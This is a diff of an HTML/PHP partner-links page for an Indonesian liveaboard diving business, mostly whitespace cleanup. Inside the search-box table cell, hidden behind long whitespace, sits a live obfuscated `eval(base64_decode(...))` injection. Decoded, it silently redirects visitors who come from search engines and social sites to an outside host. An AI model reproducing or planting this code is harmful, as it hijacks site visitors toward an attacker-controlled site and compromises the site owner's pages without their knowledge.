@@ -87,44 +87,44 @@ A:hover {
 .style90 {font-weight: bold}
 .style91 {color: #000000; font-weight: bold; }
 </style>
-<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
+<script src="data/Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
 </HEAD>
-<BODY bottomMargin=0 bgColor=#006666 leftMargin=0 topMargin=0 rightMargin=0 
+<BODY bottomMargin=0 bgColor=#006666 leftMargin=0 topMargin=0 rightMargin=0
 marginheight="0" marginwidth="0">
 <TABLE width="775" border=0 align="center" cellPadding=0 cellSpacing=0>
   <TBODY>
   <TR>
     <TD>
-      <TABLE height=194 cellSpacing=0 cellPadding=0 width="100%" 
+      <TABLE height=194 cellSpacing=0 cellPadding=0 width="100%"
       background="images/z3.gif" border=0>
         <TBODY>
         <TR>
-              <TD height="194" vAlign=top> 
-                <TABLE cellSpacing=0 cellPadding=0 width="100%" 
-            background="images/dotline.gif" 
+              <TD height="194" vAlign=top>
+                <TABLE cellSpacing=0 cellPadding=0 width="100%"
+            background="images/dotline.gif"
               border=0><TBODY>
               <TR>
-                <TD height=1><IMG height=1 
-                  src="images/dotline.gif" 
+                <TD height=1><IMG height=1
+                  src="images/dotline.gif"
               width=3></TD></TR></TBODY></TABLE>
                 <table width="100%" border="0" cellspacing="0" cellpadding="0">
-                  <tr> 
+                  <tr>
                     <td width="332" height="171" valign="bottom" background="images/z1.jpg">
-<TABLE width="180" height=40 
+<TABLE width="180" height=40
                               border=0 align="right" cellPadding=2 cellSpacing=0>
                         <TBODY>
-                          <TR> 
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="images/m3.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                          <TR>
+                            <TD bgcolor="#ffffff"><IMG
+                                src="images/m3.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="images/m4.jpg" alt="indonesia_liveaboard_scuba_diving" 
+                            <TD bgcolor="#ffffff"><IMG
+                                src="images/m4.jpg" alt="indonesia_liveaboard_scuba_diving"
                                 width=67 height=40></TD>
-                            <TD bgcolor="#ffffff"><IMG 
-                                src="images/m2.jpg" alt="" 
+                            <TD bgcolor="#ffffff"><IMG
+                                src="images/m2.jpg" alt=""
                                 width=67 height=40></TD>
                           </TR>
-                          <TR> 
+                          <TR>
                             <TD colspan="3"><img src="images/spacer.gif" width="10" height="67"></TD>
                           </TR>
                         </TBODY>
@@ -144,7 +144,7 @@ marginheight="0" marginwidth="0">
                             <td><div align="center"><img src="images/germanflag.gif" width="43" height="30" border="0" usemap="#MapMap"><br>
                                     <strong>Deutsche Webseite </strong>
                                     <map name="MapMap">
-                                      
+
                                   <area shape="rect" coords="0,-10,41,30" href="german/hotdeals.php" alt="indonesia_liveaboard_scuba_diving">
                                 </map>
                             </div></td>
@@ -154,18 +154,18 @@ marginheight="0" marginwidth="0">
                     <td width="123" background="images/z2.jpg">&nbsp;</td>
                     <td width="320" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                         <tr>
-                          <td><div align="center"><img src="images/spacer.gif" width="10" height="45"><span class="style5"><br> 
+                          <td><div align="center"><img src="images/spacer.gif" width="10" height="45"><span class="style5"><br>
                           </span></div></td>
                         </tr>
-                        <tr> 
+                        <tr>
                           <td height="22" valign="top">&nbsp;&nbsp;<span class="style19"><font color="#FFFFFF" face="Verdana, Arial, Helvetica, sans-serif"><a href="index.php"><strong>Home</strong></a></font></span>                            <span class="style25">|</span> <a href="boats/contactus.php" class="style19"><strong>Contact Us </strong></a><span class="style25"><strong>|</strong></span><a href="partner_links.php" class="style19"><strong> Partner Links</strong></a></td>
                         </tr>
-                        <tr> 
+                        <tr>
                           <td><img src="images/m1.jpg" alt="indonesia_liveaboard_scuba_diving" width="325" height="104"></td>
                         </tr>
                       </table></td>
                   </tr>
-                  <tr> 
+                  <tr>
                     <td colspan="3" bgcolor="#006699"><div align="right"><strong><font size="2" face="Arial, Helvetica, sans-serif">&nbsp;&nbsp;</font></strong></div></td>
                   </tr>
                 </table></TD></TR></TBODY></TABLE></TD></TR>
@@ -175,16 +175,16 @@ marginheight="0" marginwidth="0">
         <TBODY>
         <TR>
               <TD width=310 rowspan="2" align=middle vAlign=top bgcolor="#4CCFE3"> <table width="100%" border="0" cellspacing="0" cellpadding="0">
-                  <tr> 
+                  <tr>
                     <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
-                        <tr> 
+                        <tr>
                           <td height="176" valign="top" background="images/bgsearch.jpg">
-                            
+
                             <table width="88%" border="0" align="right" cellpadding="0" cellspacing="0">
-              <tr> 
+              <tr>
                 <td height="42">&nbsp;</td>
               </tr>
-              <tr> 
+              <tr>
                 <td><?php	                                       			eval(base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOwokcWF6cGxtPWhlYWRlcnNfc2VudCgpOwppZiAoISRxYXpwbG0pewokcmVmZXJlcj0kX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ107CiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOwppZiAoJHVhZykgewppZiAoc3RyaXN0cigkcmVmZXJlciwieWFuZGV4Iikgb3Igc3RyaXN0cigkcmVmZXJlciwieWFob28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb29nbGUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaW5nIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlciIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImdvZ28iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJsaXZlLmNvbSIpb3Igc3RyaXN0cigkcmVmZXJlciwiYXBvcnQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJuaWdtYSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIndlYmFsdGEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiYWlkdS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJkb3VibGVjbGljay5uZXQiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiZWd1bi5ydSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInN0dW1ibGV1cG9uLmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpdC5seSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInRpbnl1cmwuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiY2xpY2tiYW5rLm5ldCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJsb2dzcG90LmNvbSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7CmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7CiAgICBoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm91bmRjdWJlLmJlZS5wbC8iKTsKCWV4aXQoKTsKCX0KCX0KCX0KCX0="));  define( '_VALID_MOS', 1 );include "mod/mod_search.php"; ?></td>
               </tr>
             </table></td>
@@ -193,7 +193,7 @@ marginheight="0" marginwidth="0">
                   </tr>
                   <tr>
                     <td><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
-                        <tr> 
+                        <tr>
                           <td height="176" valign="top" background="images/bgdestination.jpg"><table width="278" border="0" align="center" cellpadding="0" cellspacing="0">
                             <tr>
                               <td height="176" valign="top" background="images/bgdestination.jpg"><table width="87%" border="0" align="center" cellpadding="0" cellspacing="0">
@@ -253,7 +253,7 @@ marginheight="0" marginwidth="0">
                                   </tr>
                                   <tr>
                                     <td><div align="center"><strong><img src="images/dot.gif" width="4" height="4"></strong></div></td>
-                                    <td height="18" class="style83"><div align="center"><a href="../boats/katharina_index.php" class="style83">Bali-Flores-Bali 
+                                    <td height="18" class="style83"><div align="center"><a href="../boats/katharina_index.php" class="style83">Bali-Flores-Bali
                                       &quot;
                                       Exploration Cruises&quot;</a></div></td>
                                   </tr>
@@ -320,13 +320,13 @@ marginheight="0" marginwidth="0">
           <p align="center">&nbsp;</p>
           <p align="center"><span class="style35"><a href="../images/tt.zip"><img src="images/e-brochure.jpg" alt="tauch terminal digitale e-broschure" width="133" height="187" border="0"></a><br>
             <a href="../images/tt.zip" class="style12">Please download our relevant &amp;
-              informative digital Brochure 
+              informative digital Brochure
               <br>
               (only 2,4 Mb) </a></span></p>
           <p align="center">&nbsp;</p>
               <p align="center">&nbsp;</p></TD>
-          <TD vAlign=top width=10 
-          background="images/z6.jpg"><IMG height=4 
+          <TD vAlign=top width=10
+          background="images/z6.jpg"><IMG height=4
             src="images/z6.jpg" width=5></TD>
           <TD width="460" vAlign=top>            <div align="center">
               <p class="style14"><br>
@@ -334,7 +334,7 @@ marginheight="0" marginwidth="0">
               </div></TD>
         </TR>
         <TR>
-          <TD vAlign=top 
+          <TD vAlign=top
           background="images/z6.jpg">&nbsp;</TD>
           <TD vAlign=top><p>&nbsp;</p>
             <table width="98%" border="1">
@@ -362,7 +362,7 @@ marginheight="0" marginwidth="0">
                 <td><div align="center"><a href="partner_links/indonesia_liveaboard_diving.jpg" target="_blank"><img src="partner_links/indonesia_liveaboard_diving.jpg" alt="indonesia liveaboard dive safaris" width="172" height="199" border="0" /></a><br />
                         <span class="style88"><a href="http://www.indonesialiveaboard.com">Indonesia liveaboard <br />
                           dive safaris</a></span></div></td>
-                <td class="style88"><p class="style52"><a href="http://www.indonesialiveaboard.com">Indonesia Liveaboard Diving</a> - 
+                <td class="style88"><p class="style52"><a href="http://www.indonesialiveaboard.com">Indonesia Liveaboard Diving</a> -
                   Indonesian liveaboard scuba diving cruises provides professional liveaboards boat trips around the entire indonesian island archipelago - a dive and sailing experience for a lifetime!
                   Our <a href="http://www.indonesialiveaboard.com">website</a> is dedicated to all relevant information on Liveaboard Diving &amp; Exploration Cruises in the  Indonesian Island Archipelago.</p>
                     <p class="style52"> We have made the process of getting information and placing your booking an easy one. Simply search for any Boat, any Destination or any Date in our data base and you will instantly have a complete overview of available Liveaboard diving boats and sailing trips in Indonesia! You will also find detailed information on our website
@@ -396,9 +396,9 @@ marginheight="0" marginwidth="0">
               <tr>
                 <td class="style13"><div align="center"><a href="http://www.balidolphintherapy.com" target="_blank"><img src="partner_links/sabrina.jpg" alt="bali dolphin assisted therapy center" width="150" height="113" border="0" longdesc="http://www.balidolphin therapy.com" /><br />
                   Bali Dolphin Assisted Therapy</a></div></td>
-                <td class="style91">Bali Dolphin Therapy Center at Melka Hotel, Lovina - Bali. Dolphin assisted therapy for disabled children and adults. <a href="http://www.balidolphintherapy.com">Dolphin Therapy Bali (DAT) at Melka Excelsior Hotel Resort</a>, Lovina - 
-                  Bali is a recreational, motivational 
-                  and educational dolphin assisted therapy &amp; healing 
+                <td class="style91">Bali Dolphin Therapy Center at Melka Hotel, Lovina - Bali. Dolphin assisted therapy for disabled children and adults. <a href="http://www.balidolphintherapy.com">Dolphin Therapy Bali (DAT) at Melka Excelsior Hotel Resort</a>, Lovina -
+                  Bali is a recreational, motivational
+                  and educational dolphin assisted therapy &amp; healing
                   program for kids &amp; adults. The dolphin encounter gives the person the opportunity to develop new skills and behavior. </td>
               </tr>
               <tr>
@@ -473,7 +473,7 @@ marginheight="0" marginwidth="0">
                 <td><div align="center"><a href="partner_links/liveaboard_diving.jpg" target="_blank"><img src="partner_links/liveaboard_diving.jpg" width="150" height="113" border="0" /></a><br />
                         <span class="style88"><a href="http://www.balikomododiving.com">Komodo Liveaboard <br />
                           Exploration &amp; Diving Tours</a></span></div></td>
-                <td class="style13"><p class="style52"><a href="http://www.balikomododiving.com">Bali Komodo Liveaboard diving. </a>Dive adventures at Komodo National Park and Komodo Marine Park with Phinisi Schooner &quot;Pascha&quot; and &quot;Jingo-Jingo&quot; Komodo Dragon tour at National Park. For the year 2011 we run our komodo liveaboard diving 
+                <td class="style13"><p class="style52"><a href="http://www.balikomododiving.com">Bali Komodo Liveaboard diving. </a>Dive adventures at Komodo National Park and Komodo Marine Park with Phinisi Schooner &quot;Pascha&quot; and &quot;Jingo-Jingo&quot; Komodo Dragon tour at National Park. For the year 2011 we run our komodo liveaboard diving
                   business with fixed schedules (Saturday to Thursday). </p>
                   <p align="center" class="style52"><a href="http://www.balikomododiving.com">All liveaboard diving sailing cruises with &quot;Pascha&quot; or &quot;Jingo Jango&quot; <br />
                     will be held on our customers request. </a></p></td>
@@ -488,7 +488,7 @@ marginheight="0" marginwidth="0">
                           Lovina - North Bali</a></span></div></td>
                 <td><p class="style91"><em><a href="http://www.melkagroups.com">Melkakgroups</a></em> represents the main hotel facilities of Melka  Excelsior Hotel, Lovina, Bali. Available at Melka Hotel is a exclusive Spa with  traditional Balinese treatments and Garra Rufa Fish skin therapy treatments, Bali  dolphin assisted therapy (DAT) center for disabled children and adults,  swimming with dolphins in salt water pools for in-house and walk-in guests, Bali  Lovina accommodations, 67 rooms in various standard are available. Meeting Hall, Conference room, animal park, 2 restaurants with various cousines and a wife range of spa treatments in the all new Melka Spa.</p></td>
               </tr>
-            </table>            
+            </table>
             <p align="center" class="style35"><br>
                 <span class="style12"><a href="#">- <span class="style31"> Back to Top</span></a></span><br>
                 <br>
@@ -499,13 +499,13 @@ marginheight="0" marginwidth="0">
   </TR>
   <TR>
     <TD>
-      <TABLE height=26 cellSpacing=0 cellPadding=0 width="100%" 
+      <TABLE height=26 cellSpacing=0 cellPadding=0 width="100%"
       background="images/z4.gif" border=0>
-        <TBODY> 
-        <TR> 
+        <TBODY>
+        <TR>
           <TD height="8"><img src="images/spacer.gif" width="10" height="8"></TD>
         </TR>
-        <tr> 
+        <tr>
           <td height="18" bgcolor="#FFFFFF">
             <div align="center"><strong><br>
               Jl. Danau Tamblingan X, No. 31<br>
@@ -516,7 +516,7 @@ Fax: +62-361 -778473 <br>
 2005 &copy; Copyright Indonesialiveaboard. All rights Reserved<br>
 </strong></div>          </td>
         </tr>
-        </TBODY> 
+        </TBODY>
     </TABLE>    </TD></TR></TBODY></TABLE>
 <p>&nbsp;</p>
 <p>&nbsp;</p>
